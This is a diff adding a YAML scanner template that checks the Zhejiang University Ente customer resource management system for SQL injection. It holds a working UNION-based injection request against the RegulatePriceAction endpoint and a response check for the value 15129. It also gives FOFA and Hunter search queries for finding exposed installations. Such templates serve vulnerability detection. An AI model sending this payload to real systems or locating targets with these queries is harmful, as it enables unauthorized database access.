@@ -1,0 +1,15 @@
+name: zdet-sqli
+rules:
+  - method: GET
+    path:  /entsoft/RegulatePriceAction.entsoft;.js?method=getRegulatePricedlist&regulatepcnum=1'+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,NULL,NULL,123*123,111*1111--+
+    headers:
+    body: 
+    expression:                          
+      status_code: 200 
+      response_header:  
+      response_body: 15129
+detail:
+  description: "浙大恩特客户资源管理系统RegulatePriceAction.entsoft;.js接口存在SQL注入。截至2024/4/15发现部分网站存在该漏洞。"
+  search: 
+    fofa: title="欢迎使用浙大恩特客户资源管理系统"||app="浙大恩特客户资源管理系统"
+    鹰图: web.title="欢迎使用浙大恩特客户资源管理系统"
